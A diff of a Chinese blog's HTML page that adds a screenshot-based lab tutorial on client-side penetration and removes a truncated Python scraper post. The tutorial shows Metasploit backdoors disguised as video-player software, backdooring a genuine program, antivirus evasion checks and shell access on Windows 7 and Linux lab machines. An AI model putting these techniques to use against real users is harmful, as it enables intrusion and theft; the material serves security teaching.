+<p><strong>应对方法</strong>：安装杀毒软件，杀毒软件会发出警告或杀掉木马。也可以查看宏来判断</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">客户端渗透</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-17 10:38:12 / 修改时间：10:38:54" itemprop="dateCreated datePublished" datetime="2021-08-17T10:38:12+08:00">2021-08-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h1><h2 id="一、客户端渗透原理"><a href="#一、客户端渗透原理" class="headerlink" title="一、客户端渗透原理"></a>一、客户端渗透原理</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201142972.png" alt="image-20210816201142972"></p>
+<h2 id="二、制作Windows恶意软件获取shell"><a href="#二、制作Windows恶意软件获取shell" class="headerlink" title="二、制作Windows恶意软件获取shell"></a>二、制作Windows恶意软件获取shell</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201337098.png" alt="image-20210816201337098"></p>
+<h3 id="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"><a href="#实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马" class="headerlink" title="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"></a>实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201528885.png" alt="image-20210816201528885"></p>
+<h3 id="2-1生成西瓜影音-exe后门程序"><a href="#2-1生成西瓜影音-exe后门程序" class="headerlink" title="2.1生成西瓜影音.exe后门程序"></a>2.1生成西瓜影音.exe后门程序</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201708965.png" alt="image-20210816201708965"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201745558.png" alt="image-20210816201745558"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201820472.png" alt="image-20210816201820472"></p>
+<p>环境：kali、win7（靶机）</p>
+<h4 id="步骤1：生成后门程序并启动服务器"><a href="#步骤1：生成后门程序并启动服务器" class="headerlink" title="步骤1：生成后门程序并启动服务器"></a>步骤1：生成后门程序并启动服务器</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201959791.png" alt="image-20210816201959791"></p>
+<h4 id="步骤2：在MSF上启动handler开始监听后门程序"><a href="#步骤2：在MSF上启动handler开始监听后门程序" class="headerlink" title="步骤2：在MSF上启动handler开始监听后门程序"></a>步骤2：在MSF上启动handler开始监听后门程序</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203201351.png" alt="image-20210816203201351"></p>
+<p>启动msf</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203308925.png" alt="image-20210816203308925"></p>
+<p>加载hander模块</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203337202.png" alt="image-20210816203337202"></p>
+<p>配置payload</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203450238.png" alt="image-20210816203450238"></p>
+<p>查看并配置参数、启动</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203609271.png" alt="image-20210816203609271"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203656900.png" alt="image-20210816203656900"></p>
+<p>补充：启动后就在监听了</p>
+<h4 id="步骤3：win7下载木马文件并运行"><a href="#步骤3：win7下载木马文件并运行" class="headerlink" title="步骤3：win7下载木马文件并运行"></a>步骤3：win7下载木马文件并运行</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202231441.png" alt="image-20210816202231441"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202251261.png" alt="image-20210816202251261"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203759663.png" alt="image-20210816203759663"></p>
+<h4 id="步骤4：查看结果并提升权限"><a href="#步骤4：查看结果并提升权限" class="headerlink" title="步骤4：查看结果并提升权限"></a>步骤4：查看结果并提升权限</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203911048.png" alt="image-20210816203911048"></h4><p>查看权限</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204025799.png" alt="image-20210816204025799"></p>
+<p>提升权限</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204236941.png" alt="image-20210816204236941"></p>
+<p>其他操作</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204419164.png" alt="image-20210816204419164"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204435891.png" alt="image-20210816204435891"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204609219.png" alt="image-20210816204609219"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204637881.png" alt="image-20210816204637881"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204731011.png" alt="image-20210816204731011"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204847203.png" alt="image-20210816204847203"></p>
+<p>补充：软件病毒/木马等扫描网站</p>
+<p>1.可以把程序/软件会被那些杀毒软件扫描出来</p>
+<p>2.可以检测自己制作的木马可以避开率</p>
+<p>扫描网站1：<a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202542969.png" alt="image-20210816202542969"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202732647.png" alt="image-20210816202732647"></p>
+<p>扫描网站2：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202846223.png" alt="image-20210816202846223"></p>
+<h3 id="2-2模拟黑客给真正的软件加上后门"><a href="#2-2模拟黑客给真正的软件加上后门" class="headerlink" title="2.2模拟黑客给真正的软件加上后门"></a>2.2模拟黑客给真正的软件加上后门</h3><h4 id="步骤1：下载正版软件并安装上后门"><a href="#步骤1：下载正版软件并安装上后门" class="headerlink" title="步骤1：下载正版软件并安装上后门"></a>步骤1：下载正版软件并安装上后门</h4><p>下载程序</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205146217.png" alt="image-20210816205146217"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205214862.png" alt="image-20210816205214862"></p>
+<p>查找要安装后门的程序（副程序：主程序启动会带动其启动）</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205633896.png" alt="image-20210816205633896"></p>
+<h4 id="步骤2：把副程序复制到kali进行安装后门"><a href="#步骤2：把副程序复制到kali进行安装后门" class="headerlink" title="步骤2：把副程序复制到kali进行安装后门"></a>步骤2：把副程序复制到kali进行安装后门</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205914655.png" alt="image-20210816205914655"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205939315.png" alt="image-20210816205939315"></p>
+<p>安装后门</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210009776.png" alt="image-20210816210009776"></p>
+<p>win7下载安装了后门的程序并替换正版的程序</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210157882.png" alt="image-20210816210157882"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210214266.png" alt="image-20210816210214266"></p>
+<p>步骤3：启动</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210303111.png" alt="image-20210816210303111"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210315008.png" alt="image-20210816210315008"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210349331.png" alt="image-20210816210349331"></p>
+<p>回到win7启动软件</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210438619.png" alt="image-20210816210438619"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210512609.png" alt="image-20210816210512609"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210616482.png" alt="image-20210816210616482"></p>
+<h3 id="2-3-使用metasploit的evasion模块生成后门木马"><a href="#2-3-使用metasploit的evasion模块生成后门木马" class="headerlink" title="2.3 使用metasploit的evasion模块生成后门木马"></a>2.3 使用metasploit的evasion模块生成后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210719911.png" alt="image-20210816210719911"></p>
+<h4 id="步骤1：查找并加载模块"><a href="#步骤1：查找并加载模块" class="headerlink" title="步骤1：查找并加载模块"></a>步骤1：查找并加载模块</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210803467.png" alt="image-20210816210803467"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210832486.png" alt="image-20210816210832486"></p>
+<h4 id="步骤2：修改木马文件名称（可以不修改）"><a href="#步骤2：修改木马文件名称（可以不修改）" class="headerlink" title="步骤2：修改木马文件名称（可以不修改）"></a>步骤2：修改木马文件名称（可以不修改）</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210936108.png" alt="image-20210816210936108"></p>
+<h4 id="步骤3：设置payload"><a href="#步骤3：设置payload" class="headerlink" title="步骤3：设置payload"></a>步骤3：设置payload</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211013243.png" alt="image-20210816211013243"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211051718.png" alt="image-20210816211051718"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211129141.png" alt="image-20210816211129141"></p>
+<p>启动生成文件</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211209466.png" alt="image-20210816211209466"></p>
+<p>补充：上传文件，方便win7下载（也可以直接复制）</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211330054.png" alt="image-20210816211330054"></p>
+<h4 id="步骤4：监听"><a href="#步骤4：监听" class="headerlink" title="步骤4：监听"></a>步骤4：监听</h4><p>渗透：加载模块、配置参数</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211521609.png" alt="image-20210816211521609"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211559689.png" alt="image-20210816211559689"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211611575.png" alt="image-20210816211611575"></p>
+<h4 id="步骤5：win7启动木马文件"><a href="#步骤5：win7启动木马文件" class="headerlink" title="步骤5：win7启动木马文件"></a>步骤5：win7启动木马文件</h4><p>下载文件</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211648937.png" alt="image-20210816211648937"></p>
+<p>启动木马文件</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211730407.png" alt="image-20210816211730407"></p>
+<p>kali查看结果</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211810550.png" alt="image-20210816211810550"></p>
+<h2 id="三、制作Linux恶意软件获取shell"><a href="#三、制作Linux恶意软件获取shell" class="headerlink" title="三、制作Linux恶意软件获取shell"></a>三、制作Linux恶意软件获取shell</h2><p><strong>步骤1：使用msfvenom生成linux可执行文件，再开启apache服务</strong></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102634654.png" alt="image-20210817102634654"></p>
+<p>补充：这里的恶意文件是放在根目录下的，所以linux下载直接是ip地址+</p>
+<p><strong>步骤2：linux系统下载恶意文件</strong></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102923861.png" alt="image-20210817102923861"></p>
+<p>此时文件是不可执行的，所以要提升权限</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103147429.png" alt="image-20210817103147429"></p>
+<p>步骤3：设置linux的payload并</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103256476.png" alt="image-20210817103256476"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103309884.png" alt="image-20210817103309884"></p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103341812.png" alt="image-20210817103341812"></p>
+<p>步骤4：linux启动程序</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103420606.png" alt="image-20210817103420606"></p>
+<p>步骤5：查看结果与操作</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103501914.png" alt="image-20210817103501914"></p>
+<p>查看当前目录</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103601631.png" alt="image-20210817103601631"></p>
+<p>查看身份权限</p>
+<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103644708.png" alt="image-20210817103644708"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1152,263 +1640,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/07/15/python%E7%88%AC%E5%8F%96%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%AD%98%E5%88%B0SQLite%E6%95%B0%E6%8D%AE%E5%BA%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/15/python%E7%88%AC%E5%8F%96%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%AD%98%E5%88%B0SQLite%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">python爬取数据并存到SQLite数据库</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-07-15 17:13:57" itemprop="dateCreated datePublished" datetime="2021-07-15T17:13:57+08:00">2021-07-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-29 09:20:58" itemprop="dateModified" datetime="2021-07-29T09:20:58+08:00">2021-07-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">python入门</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="python项目2"><a href="#python项目2" class="headerlink" title="python项目2"></a>python项目2</h2><p>项目说明：爬取豆瓣电影网站的Top250部电影的详情信息并存在SQLite</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2021&#x2F;7&#x2F;10 18:10</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"></span><br><span class="line">from bs4 import BeautifulSoup        #网页解析，获取数据</span><br><span class="line">import re           #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error       #制定URL，获取网页数据</span><br><span class="line">import sqlite3      #进行SQLite数据库操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D; r&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    #步骤1：爬取网页 #步骤2：解析数据</span><br><span class="line">    datalist &#x3D; getData(baseurl)     #放回爬取的数据给datalist</span><br><span class="line">    #保存路径</span><br><span class="line">    dbpath &#x3D; &quot;movie.db&quot;</span><br><span class="line">    #步骤3：保存数据</span><br><span class="line">    saveData2DB(datalist,dbpath)</span><br><span class="line"></span><br><span class="line">   # askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#正则表达式对象</span><br><span class="line">#影片详情链接规则</span><br><span class="line"># .* 与（.*）的区别，（.*）是匹配成功作为返回值，.*是纯匹配</span><br><span class="line">findLink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)      #&quot;?&quot;代表0个或多个，在可能没有的时候要加“?”</span><br><span class="line">#影片图片</span><br><span class="line">findImgSrc &#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S)  #re.S:解析匹配包括换行符，在有可能有多行的字符串时用</span><br><span class="line">#影片的片面</span><br><span class="line">findTitle &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;title&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#影片评分</span><br><span class="line">findRating &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;rating_num&quot; property&#x3D;&quot;v:average&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#评价人数</span><br><span class="line">findJudge &#x3D; re.compile(r&#39;&lt;span&gt;(\d*)人评价&lt;&#x2F;span&gt;&#39;)    #因为有结构相同的，所以正则表达式要变通，\d是指数字</span><br><span class="line">#概况</span><br><span class="line">findInq &#x3D; re.compile(r&#39;&lt;span class&#x3D;&quot;inq&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#影片简介</span><br><span class="line">findBd &#x3D; re.compile(r&#39;&lt;p class&#x3D;&quot;&quot;&gt;(.*?)&lt;&#x2F;p&gt;&#39;,re.S)</span><br><span class="line"></span><br><span class="line">#爬取网页</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist &#x3D; []</span><br><span class="line">    for i in range(0,10):           #调用获取页面信息的函数，10次</span><br><span class="line">        url &#x3D; baseurl + str(i*25)   #每页有25个，所以这样写</span><br><span class="line">        html &#x3D; askURL(url)          #保存获取到的网页源码</span><br><span class="line">        #步骤2：逐一解析数据</span><br><span class="line">        soup &#x3D;BeautifulSoup(html,&quot;html.parser&quot;)     #参数1：类型，参数2：解析器</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;):     #查找符合要求的字符串并形成列表（在div标签中寻找class&#x3D;item的字符串）</span><br><span class="line">            #print(item)    测试：打印电影item的全部信息</span><br><span class="line">            data &#x3D; []       #保存一部电影的全部信息</span><br><span class="line">            item &#x3D; str(item)    #转为字符串，用于查找</span><br><span class="line"></span><br><span class="line">            #影片详情的链接</span><br><span class="line">            link &#x3D; re.findall(findLink,item)[0]     #re库通过正则表达式解析出符合规定的字符串（链接）</span><br><span class="line">            data.append(link)                       #添加到列表里</span><br><span class="line"></span><br><span class="line">            imgSrc &#x3D; re.findall(findImgSrc,item)[0] #只取第一个（下标0）是因为网页有重复使用</span><br><span class="line">            data.append(imgSrc)</span><br><span class="line"></span><br><span class="line">            titles &#x3D; re.findall(findTitle,item)</span><br><span class="line">            if(len(titles)&#x3D;&#x3D;2):     #由网站可知，一部电影有很多名字</span><br><span class="line">                ctitle &#x3D; titles[0]  #添加中文名</span><br><span class="line">                otitle &#x3D; titles[1].replace(&quot;&#x2F;&quot;,&quot;&quot;)  #添加外文名并去掉无关符号</span><br><span class="line">                data.append(ctitle)</span><br><span class="line">                data.append(otitle)</span><br><span class="line">            else:</span><br><span class="line">                data.append(titles[0])</span><br><span class="line">                data.append(&#39; &#39;)       #若没有2个名字就留空</span><br><span class="line"></span><br><span class="line">            rating &#x3D; re.findall(findRating,item)[0]</span><br><span class="line">            data.append(rating)             #添加评分</span><br><span class="line"></span><br><span class="line">            judgeNum &#x3D; re.findall(findJudge,item)[0]</span><br><span class="line">            data.append(judgeNum)           #添加评价人数</span><br><span class="line"></span><br><span class="line">            inq &#x3D; re.findall(findInq,item)</span><br><span class="line">            if len(inq) !&#x3D; 0:</span><br><span class="line">                inq &#x3D; inq[0].replace(&quot;。&quot;,&quot;&quot;)    